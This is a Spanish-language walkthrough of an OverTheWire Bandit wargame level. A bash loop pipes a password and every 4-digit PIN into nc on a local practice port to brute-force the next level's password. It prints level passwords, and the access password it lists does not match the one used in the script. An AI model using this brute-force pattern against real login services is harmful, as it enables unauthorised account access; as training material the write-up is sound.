## Objetivo 

Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le da la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando todas las 10000 combinaciones, lo que se denomina fuerza bruta.
No es necesario crear nuevas conexiones cada vez.

## Datos de acceso al nivel

user bandit24
pass VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solucion

```
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar Timeout. Exiting.
   
bandit24@bandit:~$ cd /tmp
bandit24@bandit:/tmp$ mkdir bandit24_xd
bandit24@bandit:/tmp$ cd bandit24_xd
bandit24@bandit:/tmp/bandit24_xd$ nano test.sh
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

/////////////

```bash
#!/bin/bash

for i in {0000..9999}
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done

```
```

///////////


bandit24@bandit:/tmp/bandit24_xd$ chmod u+x test.sh
bandit24@bandit:/tmp/bandit24_xd$ ./test.sh | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
.........
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.

bandit24@bandit:/tmp/bandit24_xd$ ./test.sh | nc localhost 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:/tmp/bandit24_xd$ ^C



```

## Notas adicionales


Un bucle for en bash tiene la siguiente sintaxis:

```
1 for var in 1 2 ... N
2 do
3	#something
4 done
```


Si la variable se repite en un rango específico, podría ser más fácil escribir solo los límites. Por ejemplo, si queremos recorrer del 1 al 10, la sintaxis sería {0..10}. Si además queremos que cada número tenga dos dígitos (00, 01, 02,… 10), podemos agregar el dígito cero al número {00..10}.

## Referencias 


https://www.hostinger.mx/tutoriales/bash-for-loop-guia-ejemplos